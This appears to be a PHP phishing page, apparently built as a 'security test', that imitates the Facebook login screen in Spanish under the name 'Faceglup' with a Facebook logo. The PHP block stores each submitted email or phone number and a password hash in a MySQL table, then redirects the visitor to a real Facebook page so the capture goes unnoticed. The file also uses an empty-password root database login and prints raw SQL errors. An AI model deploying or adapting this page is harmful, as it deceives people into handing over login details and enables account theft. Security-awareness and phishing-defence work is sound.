<?php

// Database connection (for demonstration)
$server = "localhost";
$username = "root";
$password = "";
$db = "seguridadb";
$conn = new mysqli($server, $username, $password, $db);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email_or_phone = $conn->real_escape_string($_POST['email_or_phone']);
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);

    $sql = "INSERT INTO users (email_or_phone, password) VALUES ('$email_or_phone', '$password')";

    if ($conn->query($sql) === TRUE) {
        // Redirect to the official Facebook page after successful insertion
        header('Location: https://m.facebook.com/InnovacionSV?__tn__=C-R');
        exit();
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Prueba Seguridad</title>
</head>

<body>
    <div class="container">
        <div class="container-profile">
            <span class="logo">
                <img src="img/1.svg" alt="facebook">
            </span>
            <p class="connect-friends">Faceglup te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="container-form">
            <form class="form" method="post" action="">
                <input type="text" name="email_or_phone" placeholder="Correo electronico o numero de telefono">
                <input type="password" name="password" placeholder="Contraseña">
                <input type="submit" value="Iniciar Sesión">
                <span><a href="#">¿Olvidaste tu contraseña?</a></span>
                <div class="button"></div>
                <center>
                <input type="submit2" value="Crear cuenta nueva">
</center>
            </form>
            <p class="create-page">
                <a href="#">Crear una pagina</a> para una celebridad, una marca o un negocio.
            </p>
        </div>
    </div>
</body>
</html>